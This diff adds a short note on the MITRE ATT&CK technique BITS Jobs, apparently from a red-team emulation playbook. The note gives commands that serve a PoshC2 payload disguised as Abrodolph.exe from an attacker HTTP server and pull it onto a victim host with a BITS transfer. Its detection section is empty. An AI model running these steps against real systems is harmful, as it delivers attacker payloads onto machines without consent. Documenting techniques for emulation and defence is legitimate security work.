@@ -1,0 +1,20 @@
+# [BITS Jobs](https://attack.mitre.org/techniques/T1197/)
+
+## Exploit Syntax: 
+
+1. Run the following commands
+    ```sh
+    mkdir /home/<user>/Desktop/Lincoler
+    cd /home/<user>/Desktop/Lincoler
+    cp /var/poshc2/<project name>/payloads/<payload name> Abrodolph.exe
+    python3 -m http.server 12137
+    ```
+
+2.  In posh, run
+    ```sh
+    sharpps start-bitstransfer -source http://<malicious ip address>:12137/Abrodolph.exe -destination <victim save location>
+    ```
+
+## Detection Method
+
+## Resources    
